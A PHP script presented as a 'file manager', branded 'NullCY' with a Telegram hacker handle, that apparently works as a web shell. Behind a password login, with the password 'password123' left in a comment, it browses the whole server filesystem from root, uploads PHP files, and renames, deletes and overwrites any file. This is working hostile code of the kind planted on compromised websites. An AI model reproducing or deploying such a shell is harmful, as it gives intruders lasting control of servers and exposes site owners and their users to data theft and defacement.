<?php
// file_manager.php
session_start();

// Hardcoded password hash for login (bcrypt hashed password for 'password123')
$hashed_password = '$2y$10$Qpl2JafJwMlGHHeH1F7C4O7fnETckX/5FuJy3HQ1SKijEV4R.2Qvq';

// Check login
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $hashed_password)) {
            $_SESSION['logged_in'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_error = "Password salah.";
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body>
        <div class="container py-5">
            <h1 class="mb-4">Login</h1>
            <?php if (isset($login_error)): ?>
                <div class="alert alert-danger">
                    <?= htmlspecialchars($login_error); ?>
                </div>
            <?php endif; ?>
            <form method="POST">
                <div class="mb-3">
                    <label for="password" class="form-label">Password</label>
                    <input type="password" class="form-control" id="password" name="password" required>
                </div>
                <button type="submit" class="btn btn-primary">Login</button>
            </form>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    </body>
    </html>
    <?php
    exit;
}

// Set current directory
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
$current_dir = realpath($current_dir) ?: __DIR__;
$current_dir = str_replace('\\', '/', $current_dir);
// Definisikan base_dir (direktori tempat script berada)
$base_dir = str_replace('\\', '/', __DIR__);
// Dapatkan root direktori sistem
$root_dir = ($current_dir[1] === ':') ? substr($current_dir, 0, 3) : '/';
$items = scandir($current_dir);
$items = array_diff($items, ['.', '..']);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['delete'])) {
        $item_to_delete = basename($_POST['delete']);
        $item_path = "$current_dir/$item_to_delete";
        if (is_file($item_path)) {
            if (unlink($item_path)) {
                $_SESSION['message'] = "$item_to_delete berhasil dihapus.";
            } else {
                $_SESSION['message'] = "Gagal menghapus file $item_to_delete.";
            }
        } elseif (is_dir($item_path)) {
            if (rmdir($item_path)) {
                $_SESSION['message'] = "$item_to_delete berhasil dihapus.";
            } else {
                $_SESSION['message'] = "Gagal menghapus folder $item_to_delete.";
            }
        }
    } elseif (isset($_POST['edit']) && isset($_POST['new_name'])) {
        $item_to_edit = basename($_POST['edit']);
        $new_name = basename($_POST['new_name']);
        $old_path = "$current_dir/$item_to_edit";
        $new_path = "$current_dir/$new_name";
        if (rename($old_path, $new_path)) {
            $_SESSION['message'] = "$item_to_edit berhasil diubah menjadi $new_name.";
        } else {
            $_SESSION['message'] = "Gagal mengubah $item_to_edit.";
        }
    } elseif (isset($_POST['edit_content']) && isset($_POST['new_content'])) {
        $file_to_edit = basename($_POST['edit_content']);
        $file_path = "$current_dir/$file_to_edit";
        if (is_file($file_path)) {
            file_put_contents($file_path, $_POST['new_content']);
            $_SESSION['message'] = "Isi file $file_to_edit berhasil diperbarui.";
        } else {
            $_SESSION['message'] = "Gagal memperbarui isi file $file_to_edit.";
        }
    } elseif (isset($_POST['create_folder']) && isset($_POST['folder_name'])) {
        $folder_name = basename($_POST['folder_name']);
        $folder_path = "$current_dir/$folder_name";
        if (mkdir($folder_path)) {
            $_SESSION['message'] = "Folder $folder_name berhasil dibuat.";
        } else {
            $_SESSION['message'] = "Gagal membuat folder $folder_name.";
        }
    } elseif (isset($_POST['create_file']) && isset($_POST['file_name'])) {
        $file_name = basename($_POST['file_name']);
        $file_path = "$current_dir/$file_name";
        if (file_put_contents($file_path, '') !== false) {
            $_SESSION['message'] = "File $file_name berhasil dibuat.";
        } else {
            $_SESSION['message'] = "Gagal membuat file $file_name.";
        }
    }
    // Handle File Upload
    if (isset($_FILES['a']) && !empty($_FILES['a']['name'])) {
        $upload_dir = $current_dir;
        $filename = basename($_FILES['a']['name']);
        $target_path = $upload_dir . '/' . $filename;
        
        // Validasi file
        $allowed_extensions = ['jpg', 'jpeg', 'png', 'pdf', 'txt', 'doc', 'docx', 'php', 'html'];
        $max_file_size = 5 * 1024 * 1024; // 5MB
        $file_extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        
        // Cek error upload
        if ($_FILES['a']['error'] !== UPLOAD_ERR_OK) {
            $_SESSION['message'] = 'Upload error: ' . $_FILES['a']['error'];
        }
        // Cek ekstensi file
        elseif (!in_array($file_extension, $allowed_extensions)) {
            $_SESSION['message'] = 'File type not allowed.';
        }
        // Cek ukuran file
        elseif ($_FILES['a']['size'] > $max_file_size) {
            $_SESSION['message'] = 'File size exceeds 5MB limit.';
        }
        // Cek file sudah ada
        elseif (file_exists($target_path)) {
            $_SESSION['message'] = 'File already exists.';
        }
        // Proses upload
        elseif (move_uploaded_file($_FILES['a']['tmp_name'], $target_path)) {
            $_SESSION['message'] = "File $filename uploaded successfully!";
        } else {
            $_SESSION['message'] = 'Failed to upload file.';
        }
        
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
        exit;
    }
}

?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NullCY</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <style>
        :root {
            --bg-color: #ffffff;
            --text-color: #212529;
            --table-bg: #ffffff;
            --table-border: #dee2e6;
        }

        .dark-theme {
            --bg-color: #1a1a1a;
            --text-color: #f8f9fa;
            --table-bg: #2d2d2d;
            --table-border: #454545;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
        }

        .table {
            background-color: var(--table-bg);
            color: var(--text-color);
        }

        .table-bordered {
            border-color: var(--table-border) !important;
        }

        .table-bordered th,
        .table-bordered td {
            border-color: var(--table-border) !important;
        }
    </style>
</head>
<body>
    <div class="container py-5">
        <h1 class="mb-4">Telegram:Nullcyber_X</h1>
        <button id="themeToggle" class="btn btn-secondary me-2">
                    <i class="bi bi-moon-stars"></i> Dark Mode
                </button>
        <a href="?logout=true" class="btn btn-danger mb-3">Logout</a>
        
        <!-- Breadcrumb Navigation -->
        <nav aria-label="breadcrumb" class="mb-3">
            <ol class="breadcrumb">
                <?php
                $path_parts = explode('/', trim(str_replace($root_dir, '', $current_dir), '/'));
                $accumulated_path = $root_dir;
                
                // Tampilkan root
                echo '<li class="breadcrumb-item"><a href="?dir='.urlencode($root_dir).'">Root</a></li>';
                
                foreach ($path_parts as $part) {
                    if (empty($part)) continue;
                    $accumulated_path .= $part.'/';
                    echo '<li class="breadcrumb-item"><a href="?dir='.urlencode(rtrim($accumulated_path, '/')).'">'.htmlspecialchars($part).'</a></li>';
                }
                ?>
            </ol>
            <small class="text-muted">Current Path: <?= htmlspecialchars($current_dir) ?></small>
        </nav>

        <?php if (isset($_SESSION['message'])): ?>
            <div class="alert alert-success">
                <?= htmlspecialchars($_SESSION['message']); unset($_SESSION['message']); ?>
            </div>
        <?php endif; ?>
        	
		<form method="POST" enctype="multipart/form-data" class="mb-4">
            <div class="row">
                <div class="col-md-6">
                    <div class="input-group">
                        <input type="file" class="form-control" name="a" required>
                        <button type="submit" class="btn btn-primary">Upload File</button>
                    </div>
                </div>
            </div>
        </form>
        	
        <form method="POST" class="mb-4">
            <div class="row">
                <div class="col-md-6">
                    <div class="input-group">
                        <input type="text" name="folder_name" class="form-control" placeholder="Folder Name">
                        <button type="submit" name="create_folder" class="btn btn-primary">Create Folder</button>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="input-group">
                        <input type="text" name="file_name" class="form-control" placeholder="File Name">
                        <button type="submit" name="create_file" class="btn btn-primary">Create File</button>
                    </div>
                </div>
            </div>
        </form>

        <table class="table table-bordered">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if (empty($items)): ?>
                    <tr>
                        <td colspan="3" class="text-center">No files or folders found.</td>
                    </tr>
                <?php else: ?>
                    <?php foreach ($items as $item): ?>
                        <tr>
                            <td><?= htmlspecialchars($item); ?></td>
                            <td><?= is_dir("$current_dir/$item") ? 'Folder' : 'File'; ?></td>
                            <td>
                                <?php if (is_dir("$current_dir/$item")): ?>
                                    <a href="?dir=<?= urlencode("$current_dir/$item"); ?>" class="btn btn-primary btn-sm">Open</a>
                                <?php else: ?>
                                    <a href="<?= urlencode($item); ?>" class="btn btn-success btn-sm" download>Download</a>
            						<a href="<?= urlencode($item) ?>" class="btn btn-primary btn-sm" target="_blank">View</a>
                                    <button class="btn btn-info btn-sm" data-bs-toggle="modal" data-bs-target="#editContentModal-<?= htmlspecialchars($item); ?>">Edit Content</button>
                                <?php endif; ?>
                                <form method="POST" action="" style="display: inline;">
                                    <input type="hidden" name="delete" value="<?= htmlspecialchars($item); ?>">
                                    <button type="submit" class="btn btn-danger btn-sm">Delete</button>
                                </form>
                                <button class="btn btn-warning btn-sm" data-bs-toggle="modal" data-bs-target="#editModal-<?= htmlspecialchars($item); ?>">Rename</button>

                                <!-- Rename Modal -->
                                <div class="modal fade" id="editModal-<?= htmlspecialchars($item); ?>" tabindex="-1" aria-labelledby="editModalLabel" aria-hidden="true">
                                    <div class="modal-dialog">
                                        <div class="modal-content">
                                            <div class="modal-header">
                                                <h5 class="modal-title" id="editModalLabel">Rename <?= htmlspecialchars($item); ?></h5>
                                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                            </div>
                                            <form method="POST" action="">
                                                <div class="modal-body">
                                                    <input type="hidden" name="edit" value="<?= htmlspecialchars($item); ?>">
                                                    <div class="mb-3">
                                                        <label for="new_name" class="form-label">New Name</label>
                                                        <input type="text" class="form-control" name="new_name" id="new_name" required>
                                                    </div>
                                                </div>
                                                <div class="modal-footer">
                                                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                                                    <button type="submit" class="btn btn-primary">Save Changes</button>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                </div>

                                <!-- Edit Content Modal -->
                                <div class="modal fade" id="editContentModal-<?= htmlspecialchars($item); ?>" tabindex="-1" aria-labelledby="editContentModalLabel" aria-hidden="true">
                                    <div class="modal-dialog">
                                        <div class="modal-content">
                                            <div class="modal-header">
                                                <h5 class="modal-title" id="editContentModalLabel">Edit Content of <?= htmlspecialchars($item); ?></h5>
                                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                            </div>
                                            <form method="POST" action="">
                                                <div class="modal-body">
                                                    <input type="hidden" name="edit_content" value="<?= htmlspecialchars($item); ?>">
                                                    <div class="mb-3">
                                                        <label for="new_content" class="form-label">Content</label>
                                                        <textarea class="form-control" name="new_content" id="new_content" rows="10" required><?= htmlspecialchars(is_file("$current_dir/$item") ? file_get_contents("$current_dir/$item") : ''); ?></textarea>
                                                    </div>
                                                </div>
                                                <div class="modal-footer">
                                                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                                                    <button type="submit" class="btn btn-primary">Save Changes</button>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                </div>

                            </td>
                        </tr>
                    <?php endforeach; ?>
                <?php endif; ?>
            </tbody>
        </table>

        <!-- Back Button (Diperbarui) -->
        <?php if ($current_dir !== $root_dir): ?>
            <a href="?dir=<?= urlencode(dirname($current_dir)); ?>" class="btn btn-secondary mb-3">Back to Parent</a>
        <?php endif; ?>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Fungsi toggle theme
        function toggleTheme() {
            document.body.classList.toggle('dark-theme');
            const isDark = document.body.classList.contains('dark-theme');
            localStorage.setItem('theme', isDark ? 'dark' : 'light');
            updateButtonText(isDark);
        }

        // Update tombol theme
        function updateButtonText(isDark) {
            const button = document.getElementById('themeToggle');
            button.innerHTML = isDark 
                ? '<i class="bi bi-brightness-high"></i> Light Mode' 
                : '<i class="bi bi-moon-stars"></i> Dark Mode';
        }

        // Init theme dari localStorage
        const savedTheme = localStorage.getItem('theme') || 'light';
        if (savedTheme === 'dark') {
            document.body.classList.add('dark-theme');
            updateButtonText(true);
        }

        // Event listener untuk tombol theme
        document.getElementById('themeToggle').addEventListener('click', toggleTheme);
    </script>
</body>
</html>